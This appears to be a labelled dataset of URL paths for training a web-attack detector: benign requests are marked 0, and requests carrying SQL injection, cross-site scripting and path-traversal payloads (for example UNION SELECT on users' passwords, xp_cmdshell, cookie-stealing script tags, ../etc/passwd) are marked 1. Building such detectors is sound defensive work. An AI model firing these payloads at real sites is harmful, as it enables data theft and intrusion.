/checkout?category=tech984,0
/login?id=1941,0
/' OR '1'='1,1
/api/users,0
/checkout?user=urmit727,0
/api/users?user=urmit90,0
/api/users,0
/api/users?category=tech534,0
/index.html?category=tech163,0
/../../../windows/system32/cmd.exe,1
/products/item?search=../../../../etc/passwd,1
/products/item?page=2616,0
/admin' --,1
/api/users?category=tech36,0
/about?page=2836,0
/api/users?user=urmit764,0
/api/users?page=2690,0
/checkout?category=tech100,0
/products/item,0
/products/item?sort=asc116,0
/dashboard?category=tech921,0
/dashboard?id=1163,0
/dashboard?page=2774,0
/contact?user=urmit261,0
"/"" OR 1=1 --",1
/checkout?category=tech582,0
/products/item?id=1398,0
/javascript:eval('var a=1'),1
/login?sort=asc383,0
/products/item,0
/api/users?id=1130,0
/login?user=urmit822,0
/dashboard?page=2632,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?sort=asc912,0
/products/item?category=tech251,0
/?id=1; DROP TABLE users,1
/about?user=urmit737,0
/about,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?id=1304,0
/products/item?page=27,0
/products/item?user=urmit911,0
/dashboard?sort=asc96,0
/dashboard?page=2146,0
/api/users?user=urmit361,0
/api/users?page=2119,0
/api/users?id=1489,0
/dashboard?sort=asc668,0
/dashboard,0
/checkout?user=urmit205,0
/about,0
/index.html?id=1514,0
/api/users,0
/about?user=urmit855,0
/dashboard?user=urmit269,0
/login?sort=asc801,0
"/"" OR 1=1 --",1
/about?category=tech426,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?page=2626,0
/about?id=1942,0
/index.html?category=tech741,0
/login,0
/contact?user=urmit595,0
/dashboard,0
/index.html?page=2680,0
/api/users?user=urmit877,0
/login?category=tech790,0
/api/users?page=2238,0
/checkout?category=tech611,0
/dashboard,0
/checkout?user=urmit722,0
/products/item,0
/products/item?page=2555,0
/index.html?user=urmit826,0
/dashboard?category=tech456,0
/products/item?page=2514,0
/api/users?user=urmit331,0
/dashboard?page=2971,0
/api/users?search=javascript:eval('var a=1'),1
/api/users?sort=asc677,0
/checkout?category=tech700,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/index.html?sort=asc471,0
/checkout?category=tech348,0
/checkout?category=tech391,0
/products/item?id=1784,0
/about?search=' OR '1'='1,1
/dashboard?user=urmit371,0
/about?id=1474,0
/products/item?sort=asc582,0
/contact?page=2837,0
/checkout?user=urmit709,0
/about?id=1372,0
/dashboard?user=urmit969,0
/contact?user=urmit499,0
/index.html?user=urmit145,0
/dashboard?page=221,0
/checkout?id=1136,0
/about?page=2394,0
/api/users?sort=asc805,0
/api/users,0
/products/item?sort=asc975,0
/checkout?user=urmit125,0
/about?category=tech608,0
/api/users?page=2494,0
/<script>alert(document.cookie)</script>,1
/contact,0
/admin' --,1
/index.html?search=<script>alert(document.cookie)</script>,1
/dashboard?category=tech267,0
/api/users,0
/checkout?category=tech953,0
/login?page=2909,0
/products/item?category=tech147,0
/login?user=urmit366,0
/checkout?id=1415,0
/login,0
/contact?page=2577,0
/about?category=tech547,0
/index.html?user=urmit887,0
/login?page=2149,0
/index.html?page=2603,0
/products/item?category=tech47,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?category=tech10,0
/dashboard,0
/login,0
/'; EXEC xp_cmdshell('dir');--,1
/about?sort=asc181,0
/contact?id=1122,0
/products/item?sort=asc65,0
/products/item?category=tech621,0
/login,0
/index.html?category=tech536,0
/api/users?sort=asc323,0
/login?id=1124,0
/checkout?sort=asc107,0
/login?user=urmit730,0
/<script>alert(document.cookie)</script>,1
/dashboard?category=tech127,0
/login?user=urmit638,0
/api/users,0
/index.html?category=tech939,0
/about?search=javascript:eval('var a=1'),1
/login?page=2531,0
/checkout?user=urmit555,0
/about?category=tech287,0
"/"" OR 1=1 --",1
/index.html?sort=asc382,0
/about?id=1406,0
/api/users?category=tech838,0
/about?page=2180,0
/contact?sort=asc309,0
/about,0
/checkout?category=tech1,0
/login?id=1488,0
/contact?id=1663,0
/api/users?sort=asc807,0
/index.html,0
/javascript:eval('var a=1'),1
/login?category=tech984,0
/dashboard?page=2877,0
/contact?search=../../../windows/system32/cmd.exe,1
/index.html?page=2569,0
/api/users,0
/products/item?search=../../../../etc/passwd,1
/login?sort=asc32,0
/products/item?page=2405,0
/dashboard?sort=asc671,0
/api/users?sort=asc666,0
/contact?user=urmit15,0
/dashboard,0
/checkout?search=../../../windows/system32/cmd.exe,1
"/contact?search=UNION SELECT username, password FROM users",1
/javascript:eval('var a=1'),1
/index.html,0
/checkout?category=tech573,0
/about?category=tech63,0
/../../../../etc/passwd,1
/index.html?sort=asc205,0
/products/item?page=2724,0
/index.html?user=urmit220,0
"/about?search="" OR 1=1 --",1
/api/users?id=1115,0
/about?category=tech809,0
/products/item?category=tech781,0
/api/users?id=1274,0
/login?id=1999,0
/contact?user=urmit499,0
/dashboard?category=tech628,0
/checkout?sort=asc294,0
/products/item?category=tech811,0
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?sort=asc427,0
/api/users?id=1308,0
/index.html,0
/api/users?id=11,0
/dashboard?page=2543,0
/products/item?page=2416,0
/dashboard?sort=asc998,0
/<script>alert(document.cookie)</script>,1
/products/item,0
/api/users?sort=asc545,0
/index.html?user=urmit647,0
/index.html?page=2391,0
/contact?id=1510,0
/about?search=' OR '1'='1,1
/products/item?category=tech261,0
/products/item?id=1455,0
/dashboard,0
/<script>alert(document.cookie)</script>,1
/about,0
/checkout?page=2923,0
/?id=1; DROP TABLE users,1
/index.html?user=urmit884,0
/products/item?page=2128,0
/login?page=2965,0
/?id=1; DROP TABLE users,1
/index.html?category=tech800,0
/products/item?id=1818,0
/about,0
/<script>alert(document.cookie)</script>,1
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc310,0
/dashboard?sort=asc770,0
/about?user=urmit350,0
/dashboard?category=tech796,0
/api/users?page=2670,0
/api/users?id=1864,0
/dashboard?category=tech592,0
/about?category=tech588,0
/about,0
/?id=1; DROP TABLE users,1
/login?id=1153,0
/dashboard,0
/index.html?sort=asc475,0
/contact?page=2341,0
/about,0
/login?user=urmit650,0
"/UNION SELECT username, password FROM users",1
/admin' --,1
/../../../../etc/passwd,1
/products/item?search=' OR '1'='1,1
/login?id=1360,0
/checkout?sort=asc233,0
/login?sort=asc271,0
/about?sort=asc600,0
/?id=1; DROP TABLE users,1
/api/users?page=2120,0
/about?search=' OR '1'='1,1
/index.html?page=2549,0
/../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/api/users?sort=asc635,0
/about?category=tech571,0
/login?sort=asc679,0
"/index.html?search="" OR 1=1 --",1
/about?user=urmit926,0
/dashboard?user=urmit258,0
/login?id=1780,0
/products/item?sort=asc681,0
/about?sort=asc132,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?search=../../../../etc/passwd,1
/about?id=1461,0
/index.html?sort=asc134,0
/api/users?sort=asc606,0
/products/item?id=1947,0
/about?user=urmit622,0
/<script>alert(document.cookie)</script>,1
/about?user=urmit495,0
/checkout?page=2231,0
/login?user=urmit773,0
/../../../windows/system32/cmd.exe,1
/checkout,0
/index.html?user=urmit618,0
/api/users?user=urmit431,0
/api/users?category=tech500,0
/dashboard?id=1181,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/contact?user=urmit937,0
/products/item?sort=asc611,0
/products/item?sort=asc845,0
/products/item?user=urmit853,0
/login?page=2704,0
/api/users?category=tech626,0
/api/users?user=urmit509,0
/dashboard?user=urmit750,0
/admin' --,1
/products/item,0
/login,0
/dashboard?page=219,0
/contact?id=1830,0
/index.html?category=tech1,0
/checkout?category=tech739,0
/dashboard?user=urmit403,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
"/"" OR 1=1 --",1
/dashboard,0
/checkout,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/about?page=2454,0
/index.html?sort=asc221,0
/login?page=2779,0
/login?category=tech782,0
/index.html?page=2123,0
/api/users?sort=asc517,0
/index.html?id=1433,0
/contact?id=1641,0
/contact?user=urmit610,0
/checkout?sort=asc783,0
/about?id=1437,0
/login?page=2314,0
/api/users,0
/login?sort=asc507,0
/login?page=2651,0
/login?search=?id=1; DROP TABLE users,1
/dashboard?page=2726,0
/products/item?search=?id=1; DROP TABLE users,1
/login?page=2783,0
/contact?sort=asc463,0
/index.html?search=javascript:eval('var a=1'),1
/products/item?search=../../../../etc/passwd,1
/' OR '1'='1,1
/api/users?user=urmit557,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?id=1165,0
/checkout?sort=asc694,0
/index.html?user=urmit499,0
/api/users?search=../../../windows/system32/cmd.exe,1
/dashboard?user=urmit735,0
/index.html,0
/checkout?page=2162,0
/about?search=../../../../etc/passwd,1
/login?id=1336,0
/dashboard?sort=asc247,0
/<script>alert(document.cookie)</script>,1
/about?search=javascript:eval('var a=1'),1
/dashboard?sort=asc679,0
/login,0
/checkout?category=tech541,0
/contact?search=../../../../etc/passwd,1
/api/users?page=2923,0
/contact,0
/index.html?sort=asc667,0
/?id=1; DROP TABLE users,1
/products/item,0
/checkout?category=tech725,0
/index.html?search=javascript:eval('var a=1'),1
/products/item?search=admin' --,1
/login?search=admin' --,1
/login?search=admin' --,1
/about?user=urmit569,0
/dashboard?category=tech496,0
/admin' --,1
/login?user=urmit669,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html,0
/about?category=tech405,0
/index.html?sort=asc776,0
/dashboard?sort=asc11,0
/checkout?user=urmit896,0
/index.html?search=../../../windows/system32/cmd.exe,1
/onload=prompt(1),1
/index.html,0
/contact?search=javascript:eval('var a=1'),1
/products/item?id=1426,0
/checkout?page=2108,0
/about?category=tech459,0
/contact?sort=asc674,0
/index.html?sort=asc428,0
/index.html?user=urmit475,0
/login?category=tech369,0
/products/item?id=1342,0
/api/users?category=tech511,0
/login?sort=asc420,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2752,0
/products/item?sort=asc333,0
/api/users?user=urmit71,0
/contact?id=1973,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech212,0
/about?sort=asc476,0
/api/users?user=urmit351,0
/dashboard?user=urmit977,0
/products/item?sort=asc218,0
/checkout?category=tech804,0
/dashboard?page=2677,0
/login?search=' OR '1'='1,1
/?id=1; DROP TABLE users,1
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?page=2408,0
/<script>alert(document.cookie)</script>,1
/../../../windows/system32/cmd.exe,1
/?id=1; DROP TABLE users,1
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?category=tech574,0
/about?id=1238,0
/about?id=128,0
/about,0
/checkout?search=../../../windows/system32/cmd.exe,1
/login?page=2409,0
/index.html?id=1701,0
/products/item?search=' OR '1'='1,1
/login?user=urmit110,0
/products/item?category=tech439,0
/about?user=urmit468,0
/login?search=onload=prompt(1),1
/checkout?page=2399,0
/contact,0
/products/item,0
/login?page=2602,0
/dashboard?id=1999,0
/index.html?id=1550,0
/products/item?user=urmit907,0
/api/users?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit641,0
/login?user=urmit199,0
/login?id=1266,0
/dashboard?sort=asc376,0
/index.html?category=tech123,0
/contact?sort=asc442,0
/' OR '1'='1,1
/checkout?user=urmit694,0
/javascript:eval('var a=1'),1
/products/item,0
/contact?user=urmit112,0
/about?sort=asc656,0
/checkout?category=tech91,0
/contact?id=1581,0
/dashboard?id=1675,0
/products/item?page=2475,0
/login?id=1336,0
/admin' --,1
/contact?id=1978,0
/login?page=2868,0
/dashboard?search=../../../../etc/passwd,1
/?id=1; DROP TABLE users,1
/about?page=2974,0
/index.html?search=<script>alert(document.cookie)</script>,1
/index.html?sort=asc873,0
/contact?search=?id=1; DROP TABLE users,1
/about?user=urmit691,0
/' OR '1'='1,1
/api/users?search=../../../../etc/passwd,1
/login?id=1831,0
/checkout?page=2960,0
/dashboard?id=1163,0
/<script>alert(document.cookie)</script>,1
/' OR '1'='1,1
/products/item?sort=asc945,0
/contact,0
/login?user=urmit186,0
/products/item?search=admin' --,1
/about?category=tech19,0
/products/item?id=1821,0
/contact?category=tech816,0
/about?sort=asc793,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/login?category=tech610,0
/checkout?user=urmit541,0
/checkout?page=2195,0
/login,0
/index.html?user=urmit942,0
/about,0
/checkout,0
/about?category=tech622,0
/dashboard?sort=asc882,0
/products/item?user=urmit582,0
/../../../../etc/passwd,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about,0
/admin' --,1
/contact?page=2423,0
/index.html?id=1346,0
/dashboard?page=2299,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?id=1302,0
/dashboard,0
/api/users,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?category=tech503,0
/'; EXEC xp_cmdshell('dir');--,1
/login?page=2139,0
/products/item?page=2274,0
/dashboard?user=urmit604,0
/checkout?user=urmit211,0
"/UNION SELECT username, password FROM users",1
/about?page=2769,0
/dashboard?sort=asc689,0
/contact?page=2654,0
/index.html?search=<script>alert(document.cookie)</script>,1
/about?sort=asc804,0
/index.html,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?id=1166,0
/checkout?sort=asc709,0
/products/item?page=2161,0
/dashboard?page=2545,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about,0
/dashboard?user=urmit228,0
/about?sort=asc309,0
/login?user=urmit544,0
/checkout?search=?id=1; DROP TABLE users,1
/api/users?category=tech356,0
/contact,0
/api/users,0
"/login?search=UNION SELECT username, password FROM users",1
/onload=prompt(1),1
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?id=160,0
/api/users?page=2261,0
/contact?id=1995,0
/contact,0
/contact?user=urmit548,0
/dashboard?category=tech605,0
/login,0
/login?user=urmit984,0
/../../../../etc/passwd,1
/login,0
/index.html,0
/api/users?user=urmit843,0
/api/users?page=2493,0
/products/item?id=1558,0
/about?sort=asc504,0
/index.html?category=tech919,0
/login?page=2410,0
/login?sort=asc517,0
/login?user=urmit265,0
/dashboard?sort=asc115,0
/products/item,0
/products/item?user=urmit77,0
/login?user=urmit258,0
/checkout?category=tech112,0
/about,0
/api/users?id=1854,0
/checkout,0
/index.html?user=urmit133,0
/index.html?user=urmit475,0
/dashboard?page=2794,0
/contact?category=tech355,0
/api/users?page=2149,0
/products/item?id=1808,0
/products/item?search=onload=prompt(1),1
/index.html?id=1300,0
/contact?category=tech225,0
/api/users?id=1992,0
/checkout?category=tech852,0
/checkout,0
/products/item?id=1689,0
/../../../../etc/passwd,1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?page=2327,0
/index.html?category=tech253,0
/login?id=120,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?page=2427,0
/api/users?id=1444,0
/contact?category=tech167,0
/admin' --,1
/login?sort=asc55,0
/login?sort=asc321,0
/about?page=2340,0
/login,0
/admin' --,1
/api/users,0
"/UNION SELECT username, password FROM users",1
/dashboard?category=tech703,0
/index.html,0
/index.html?sort=asc757,0
/index.html?search=../../../windows/system32/cmd.exe,1
/products/item?page=2405,0
/index.html?user=urmit77,0
/products/item?page=2877,0
/dashboard?page=2773,0
/about?id=1918,0
/login?id=1952,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit184,0
/products/item?sort=asc220,0
/checkout?id=1614,0
/about?category=tech951,0
/index.html,0
/about?search=<script>alert(document.cookie)</script>,1
/api/users?category=tech224,0
/products/item?id=1521,0
/contact?sort=asc118,0
/dashboard?page=2843,0
/<script>alert(document.cookie)</script>,1
/index.html,0
/contact?sort=asc729,0
/' OR '1'='1,1
/about,0
/about,0
/index.html?category=tech123,0
/api/users?sort=asc412,0
/index.html?sort=asc751,0
/about?search=../../../windows/system32/cmd.exe,1
/checkout?page=2306,0
/admin' --,1
/api/users?sort=asc454,0
/about?sort=asc192,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users?page=2500,0
/api/users?category=tech140,0
/dashboard,0
/contact?category=tech550,0
/checkout?user=urmit332,0
/products/item?user=urmit73,0
/login?id=182,0
/api/users?page=2932,0
/about?id=1939,0
"/dashboard?search="" OR 1=1 --",1
/contact?id=1736,0
/api/users,0
/products/item,0
/api/users,0
/login,0
/api/users,0
/' OR '1'='1,1
/index.html,0
/about,0
/dashboard?id=1170,0
/checkout?page=2729,0
/api/users?search=admin' --,1
/about?page=270,0
/api/users?user=urmit721,0
/contact?category=tech868,0
/about,0
/about?category=tech160,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?sort=asc946,0
/about?page=2617,0
/login?search=javascript:eval('var a=1'),1
/dashboard,0
/login?search=admin' --,1
/about?sort=asc719,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit937,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit232,0
/../../../windows/system32/cmd.exe,1
/about?user=urmit358,0
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout,0
/login?sort=asc74,0
/contact?id=1277,0
/index.html?sort=asc249,0
/api/users?page=2851,0
/contact,0
/checkout?user=urmit498,0
"/UNION SELECT username, password FROM users",1
/login?sort=asc980,0
/login?category=tech465,0
/checkout?id=1214,0
/about?user=urmit395,0
/contact?id=1926,0
"/"" OR 1=1 --",1
/about?page=2100,0
"/dashboard?search="" OR 1=1 --",1
/about?search=<script>alert(document.cookie)</script>,1
/api/users?page=2197,0
/checkout?sort=asc821,0
/checkout?category=tech511,0
/login?sort=asc272,0
/index.html,0
/products/item?user=urmit805,0
/dashboard?sort=asc866,0
/about?sort=asc451,0
/about?page=2181,0
/index.html?search=../../../windows/system32/cmd.exe,1
/login?page=2255,0
/login?sort=asc478,0
/api/users,0
/login?id=1610,0
/index.html?category=tech222,0
/api/users?sort=asc611,0
/contact?id=1202,0
/dashboard?sort=asc42,0
/contact?user=urmit758,0
/index.html?user=urmit23,0
/products/item?user=urmit207,0
/products/item,0
/contact,0
/api/users?user=urmit426,0
/api/users?user=urmit242,0
/products/item?id=1651,0
/' OR '1'='1,1
/dashboard?user=urmit381,0
/checkout?user=urmit765,0
"/UNION SELECT username, password FROM users",1
/products/item?id=1761,0
/api/users?user=urmit621,0
"/UNION SELECT username, password FROM users",1
/contact?search=javascript:eval('var a=1'),1
/api/users?sort=asc650,0
/products/item?category=tech107,0
/dashboard?category=tech294,0
/about,0
/login?category=tech852,0
/contact?user=urmit857,0
/checkout?category=tech598,0
/login?sort=asc19,0
/products/item?category=tech567,0
/checkout?page=2584,0
/checkout?sort=asc498,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?sort=asc181,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?sort=asc591,0
/' OR '1'='1,1
/checkout?sort=asc700,0
/about?page=2500,0
/index.html?sort=asc152,0
/checkout?sort=asc579,0
/api/users?user=urmit33,0
/products/item?id=1903,0
/index.html?page=2928,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?search=javascript:eval('var a=1'),1
/contact?category=tech255,0
/index.html?category=tech152,0
/checkout,0
/index.html?user=urmit29,0
/index.html?sort=asc832,0
/checkout?page=2489,0
/?id=1; DROP TABLE users,1
/login?sort=asc495,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?search=../../../../etc/passwd,1
/checkout?id=1689,0
/login?id=1811,0
/products/item?id=1979,0
/api/users?user=urmit3,0
/contact,0
/checkout?page=2162,0
/index.html?search=' OR '1'='1,1
/' OR '1'='1,1
/dashboard?id=1428,0
/api/users?sort=asc90,0
/login?category=tech574,0
/login?page=2457,0
/contact,0
/login?user=urmit913,0
/javascript:eval('var a=1'),1
/dashboard,0
/contact?search=../../../../etc/passwd,1
/dashboard?user=urmit108,0
/about?user=urmit66,0
/contact?sort=asc187,0
/index.html?user=urmit642,0
/checkout?sort=asc905,0
/login?category=tech241,0
/index.html?user=urmit564,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech744,0
/about?user=urmit548,0
/login?search=javascript:eval('var a=1'),1
/contact?category=tech889,0
/login?page=2320,0
/index.html,0
/contact?category=tech242,0
/about?category=tech627,0
/index.html?sort=asc402,0
/about?user=urmit295,0
/dashboard?id=1800,0
/login?user=urmit499,0
/products/item?search=../../../../etc/passwd,1
/login?page=2849,0
/api/users?id=1829,0
/dashboard,0
/dashboard?id=1727,0
/index.html?sort=asc599,0
"/"" OR 1=1 --",1
/about?sort=asc610,0
/products/item?sort=asc338,0
/login?id=153,0
/products/item?category=tech643,0
/checkout?sort=asc414,0
/login?page=2283,0
/?id=1; DROP TABLE users,1
/about?page=2241,0
/contact?search=<script>alert(document.cookie)</script>,1
/checkout?id=1226,0
/checkout?sort=asc59,0
/about?category=tech338,0
/products/item,0
/api/users?sort=asc381,0
/dashboard?user=urmit839,0
"/dashboard?search="" OR 1=1 --",1
"/UNION SELECT username, password FROM users",1
/contact?user=urmit459,0
/api/users?category=tech46,0
/api/users,0
/admin' --,1
/login?id=1829,0
/dashboard?category=tech983,0
/api/users,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?category=tech681,0
/checkout?id=1780,0
/about,0
/contact?id=1639,0
/products/item?id=1813,0
/about?user=urmit590,0
/index.html,0
/login?sort=asc215,0
/dashboard?category=tech410,0
/contact,0
/login?category=tech771,0
/index.html?user=urmit412,0
/../../../windows/system32/cmd.exe,1
/index.html?id=1667,0
/checkout,0
/dashboard?category=tech616,0
/checkout?id=1499,0
/about?page=2557,0
/index.html?category=tech69,0
/api/users,0
/api/users,0
/onload=prompt(1),1
/contact?sort=asc965,0
/api/users?sort=asc91,0
/api/users?page=2527,0
/products/item?id=1899,0
/contact?page=2451,0
/products/item?page=233,0
/onload=prompt(1),1
/about?page=2345,0
/contact?sort=asc758,0
/about,0
/api/users,0
/checkout?category=tech418,0
/../../../windows/system32/cmd.exe,1
/products/item,0
/index.html?category=tech699,0
/../../../windows/system32/cmd.exe,1
/checkout,0
/products/item?user=urmit492,0
/contact?page=2967,0
/checkout?page=2947,0
/api/users?sort=asc873,0
/contact?sort=asc78,0
/dashboard,0
/products/item?category=tech65,0
/products/item?id=1536,0
/checkout?id=1362,0
/index.html?user=urmit486,0
/dashboard?user=urmit64,0
/dashboard?category=tech406,0
/login?sort=asc192,0
/checkout?category=tech149,0
/index.html?id=1364,0
/products/item?category=tech443,0
/?id=1; DROP TABLE users,1
/api/users?sort=asc391,0
/about?user=urmit307,0
/products/item?id=1869,0
/index.html?id=1471,0
/contact,0
/contact?sort=asc656,0
/api/users?sort=asc935,0
/checkout?id=1476,0
"/index.html?search="" OR 1=1 --",1
/onload=prompt(1),1
/checkout?id=1203,0
/index.html?sort=asc995,0
/index.html?user=urmit459,0
/dashboard,0
/products/item?page=2615,0
/api/users,0
/checkout?page=2845,0
/login?sort=asc217,0
/checkout?id=158,0
/api/users?page=2498,0
/admin' --,1
/index.html?category=tech60,0
/products/item,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?category=tech607,0
/api/users?id=1410,0
/login?user=urmit445,0
/' OR '1'='1,1
/checkout,0
/login,0
/about,0
/contact?id=1752,0
/login?page=2925,0
/?id=1; DROP TABLE users,1
/login?user=urmit271,0
/about,0
/dashboard?page=2527,0
/<script>alert(document.cookie)</script>,1
/<script>alert(document.cookie)</script>,1
/about?category=tech102,0
/api/users?sort=asc845,0
/api/users?id=1964,0
/about?id=1441,0
/products/item?search=../../../../etc/passwd,1
/contact?category=tech126,0
/checkout,0
/login,0
/index.html?category=tech524,0
/about?category=tech346,0
/dashboard?category=tech73,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech183,0
/checkout?id=126,0
/checkout?sort=asc714,0
/products/item?search=' OR '1'='1,1
/' OR '1'='1,1
/javascript:eval('var a=1'),1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/products/item?id=1722,0
/login,0
/dashboard?id=1885,0
/about?id=1480,0
/login?page=2768,0
/login?sort=asc668,0
/dashboard?id=1150,0
/api/users?page=2188,0
/login?id=1492,0
/products/item?user=urmit904,0
/login?page=2653,0
/login?page=282,0
/products/item?user=urmit879,0
/index.html?sort=asc666,0
/api/users?category=tech294,0
/api/users?id=1668,0
/onload=prompt(1),1
/?id=1; DROP TABLE users,1
/api/users,0
/dashboard?category=tech265,0
/checkout?user=urmit461,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2633,0
/products/item?search=<script>alert(document.cookie)</script>,1
/login?search=<script>alert(document.cookie)</script>,1
/about?id=1708,0
/login?search=onload=prompt(1),1
/products/item?category=tech60,0
/index.html?user=urmit103,0
/contact?category=tech691,0
/contact?user=urmit722,0
/about?page=2868,0
/login?category=tech990,0
/contact?page=2627,0
/checkout?sort=asc300,0
/about?user=urmit57,0
"/UNION SELECT username, password FROM users",1
/../../../windows/system32/cmd.exe,1
/checkout?category=tech237,0
/api/users?search=javascript:eval('var a=1'),1
/dashboard?page=2458,0
/login?category=tech458,0
/dashboard?id=1301,0
/checkout?search=onload=prompt(1),1
/dashboard,0
/checkout,0
"/about?search=UNION SELECT username, password FROM users",1
/dashboard?page=2419,0
/products/item?sort=asc823,0
/api/users,0
/about?category=tech946,0
/contact?sort=asc454,0
/index.html?sort=asc276,0
/../../../windows/system32/cmd.exe,1
/api/users?category=tech205,0
/about,0
/dashboard?category=tech377,0
/about?category=tech542,0
/dashboard?category=tech719,0
/checkout?user=urmit370,0
/api/users,0
/login?user=urmit763,0
/contact?sort=asc999,0
/api/users?sort=asc15,0
/checkout?page=2496,0
/?id=1; DROP TABLE users,1
/index.html?sort=asc679,0
/onload=prompt(1),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech950,0
/api/users?id=1536,0
/dashboard?id=1217,0
/products/item,0
/about?id=1866,0
/login?user=urmit41,0
/api/users?sort=asc593,0
/contact?page=2700,0
/about?page=2180,0
/contact?user=urmit506,0
/contact?page=238,0
/about?page=2264,0
/<script>alert(document.cookie)</script>,1
/dashboard?sort=asc623,0
/about?category=tech26,0
/products/item?sort=asc481,0
/index.html?search=' OR '1'='1,1
/about?sort=asc657,0
/dashboard,0
/api/users,0
/dashboard?sort=asc166,0
/api/users?category=tech115,0
/checkout?sort=asc252,0
/about?sort=asc68,0
/onload=prompt(1),1
/login?sort=asc556,0
/products/item?category=tech32,0
/products/item,0
/contact?page=2114,0
/login?user=urmit969,0
/dashboard?sort=asc775,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item,0
/dashboard,0
/checkout?id=1185,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?sort=asc178,0
/index.html?category=tech583,0
/products/item,0
/products/item?sort=asc897,0
/checkout?page=264,0
/products/item?category=tech474,0
/login?user=urmit678,0
/dashboard?page=2246,0
/../../../../etc/passwd,1
/contact?search=<script>alert(document.cookie)</script>,1
/login?category=tech559,0
/products/item?sort=asc62,0
/checkout,0
/products/item?search=' OR '1'='1,1
/about?category=tech278,0
/index.html?category=tech451,0
/contact?page=2175,0
/products/item?category=tech795,0
/dashboard?sort=asc700,0
/login,0
/api/users?user=urmit352,0
/index.html?sort=asc746,0
/api/users?user=urmit102,0
/dashboard?page=2534,0
/login,0
/about?page=2161,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?user=urmit944,0
/login?page=2557,0
/api/users?id=1664,0
/checkout?sort=asc32,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit41,0
/products/item?id=1926,0
/dashboard?sort=asc330,0
/products/item?page=2462,0
/checkout,0
/dashboard?page=2434,0
/dashboard,0
/api/users?id=1730,0
/about?search=../../../../etc/passwd,1
/checkout?search=admin' --,1
/contact?page=2349,0
/contact,0
/checkout?sort=asc316,0
/login?page=2712,0
/login?sort=asc617,0
/login,0
/contact,0
/about?user=urmit735,0
/index.html?id=1516,0
/api/users,0
/checkout?user=urmit368,0
/' OR '1'='1,1
/products/item?page=2721,0
/index.html?user=urmit334,0
/contact?user=urmit962,0
/checkout?id=1697,0
/index.html,0
/index.html?category=tech136,0
/index.html,0
/checkout?category=tech748,0
/about,0
/about?id=1681,0
/products/item?user=urmit694,0
/about?category=tech913,0
/index.html?id=1386,0
/'; EXEC xp_cmdshell('dir');--,1
/about,0
"/checkout?search=UNION SELECT username, password FROM users",1
/dashboard?user=urmit755,0
/products/item?user=urmit461,0
/checkout,0
/about?id=190,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users,0
/login?page=2470,0
/login?page=2660,0
/contact?search=javascript:eval('var a=1'),1
/../../../windows/system32/cmd.exe,1
/dashboard?page=2349,0
/dashboard?sort=asc250,0
/login?page=2746,0
/login?sort=asc538,0
/login,0
/login?search=' OR '1'='1,1
/api/users?search=admin' --,1
/contact?user=urmit620,0
/checkout?sort=asc688,0
"/login?search=UNION SELECT username, password FROM users",1
/contact?id=1544,0
/dashboard?user=urmit927,0
/javascript:eval('var a=1'),1
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login,0
/api/users?id=1331,0
/api/users?user=urmit533,0
"/login?search="" OR 1=1 --",1
/checkout,0
/api/users?search=' OR '1'='1,1
/checkout,0
/dashboard?category=tech350,0
/index.html?sort=asc675,0
/login,0
/login?page=21,0
/api/users?user=urmit356,0
/contact?search=?id=1; DROP TABLE users,1
/login?category=tech515,0
/products/item?sort=asc654,0
/about?sort=asc597,0
/products/item?category=tech895,0
/index.html,0
/about?user=urmit408,0
